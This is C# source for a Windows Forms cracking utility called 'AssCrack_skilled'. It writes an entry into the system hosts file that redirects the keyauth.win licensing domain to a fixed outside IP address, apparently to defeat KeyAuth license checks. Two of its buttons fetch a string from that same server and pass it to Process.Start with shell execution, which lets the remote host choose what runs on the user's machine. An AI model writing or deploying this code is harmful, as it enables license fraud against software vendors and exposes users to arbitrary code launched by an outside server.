using System.Net;
using System;
using System.Diagnostics;
using System.Media;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AssCrack_skilled
{
    public partial class Form1 : Form
    {

        private const int WM_NCHITTEST = 0x84;
        private const int HTCLIENT = 0x1;
        private const int HTCAPTION = 0x2;


        void Log(string text)
        {
            log.Items.Add(">"+text);
            log.TopIndex = log.Items.Count - 1;
        }

        ///
        /// Handling the window messages
        ///
        protected override void WndProc(ref Message message)
        {
            base.WndProc(ref message);

            if (message.Msg == WM_NCHITTEST && (int)message.Result == HTCLIENT)
                message.Result = (IntPtr)HTCAPTION;
        }
        string GetHosts()
        {
            return File.ReadAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts"));
        }
        private bool IsActive()
        {
            
            //List<string> hostNames = new List<string>();
            /*
            for(int i=0; i<hs.Length; i++)
            {
                hostNames.Add(hs[i].Split(" ")[1]);
            }
            */
            if(GetHosts().Contains("keyauth.win"))
                return true;
            return false;
        }
        void SwitchStatus()
        {
            Log("Switching Status\n\n");
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");
            try
            {
                if (!IsActive())
                {
                    bool fileExists = File.Exists(path);
                    if (!fileExists)
                    {
                        using (File.Create(path)) ;
                    }
                    using (StreamWriter w = File.AppendText(path))
                    {
                        w.WriteLine("\n51.77.48.168 keyauth.win");
                    }
                    if(IsActive())
                        Log("Success!\n\n");
                    else
                        Log("Error!\n\n");


                }
                else
                {
                    string h = GetHosts();
                    h = h.Replace("51.77.48.168 keyauth.win", string.Empty);
                    File.WriteAllLines(path, new[] { h });
                    if (!IsActive())
                        Log("Success!\n\n");
                    else
                        Log("Error!\n\n");

                }
               
             }
            catch
            {
                Log("Error modifying hosts file\n\n");
            }

            RefreshUI();
        }
        void RefreshUI()
        {
            Log("Refreshing\n\n");
            if (IsActive())
            {
                status_label.Text = "Active";
                status_label.ForeColor = Color.FromArgb(44, 184, 40);
                button1.Text = "Deactivate";
            }
            else
            {
                status_label.ForeColor = Color.FromArgb(217, 17, 54);

                status_label.Text = "Inactive";
                button1.Text = "Activate";

            }
        }
        public Form1()
        {
            InitializeComponent();
            Log("init!");
            
            RefreshUI();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SwitchStatus();

        }

        private void button4_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Log("Opening discord link...");
            try
            {
                string html = string.Empty;
                string url = @"http://51.77.48.168/dc";

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    html = reader.ReadToEnd();
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = html,
                    UseShellExecute = true
                });
            }
            catch
            {

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Log("Opening website link...");

            try
            {
                string html = string.Empty;
                string url = @"http://51.77.48.168/lynk";

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    html = reader.ReadToEnd();
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = html,
                    UseShellExecute = true
                });
            }
            catch { }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Form2 form = new Form2();
            SoundPlayer x = new SoundPlayer(Properties.Resources.start);
            x.Play();
            form.Show();
        }
    }
}